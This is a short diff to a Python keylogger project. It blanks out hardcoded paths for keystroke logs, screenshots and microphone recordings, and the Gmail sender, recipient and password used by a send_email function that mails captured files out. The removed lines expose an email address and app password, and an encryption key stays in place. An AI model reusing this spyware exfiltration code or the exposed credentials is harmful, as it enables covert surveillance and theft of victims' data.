@@ -33,10 +33,10 @@ stop = time.time() + iterationstime
 
 key_encrypt = 'GOppC9FI4qmM1d8hlH9o5BzjoFFsROD4PCsfLfsabvQ='
 
-path = 'C:\\Users\\gabri\\Desktop\\Estudos\\Python\Projetos\\Keylogger\\log.txt'
-syspath = 'C:\\Users\\gabri\\Desktop\\Estudos\\Python\Projetos\\Keylogger\\systeminfo.txt'
-imagepath = 'C:\\Users\\gabri\\Desktop\\Estudos\\Python\Projetos\\Keylogger\\Printscreen\\screen.png'
-micpath = 'C:\\Users\\gabri\\Desktop\\Estudos\\Python\Projetos\\Keylogger\\Audio\\mic.wav'
+path = ''
+syspath = ''
+imagepath = ''
+micpath = ''
 
 
 def send_email(path,filename,subject):
@@ -44,9 +44,9 @@ def send_email(path,filename,subject):
     """
     msg = MIMEMultipart()
     msg['Subject'] = 'Log'
-    msg['From'] = 'logskeyloggerlogs@gmail.com'
-    msg['To'] = 'logskeyloggerlogs@gmail.com'
-    password = 'dlqkhuiqficuycpn'
+    msg['From'] = ''
+    msg['To'] = ''
+    password = ''
 
     msg.attach(MIMEText(body_email, 'plain'))
     attachment = open(path, 'rb')
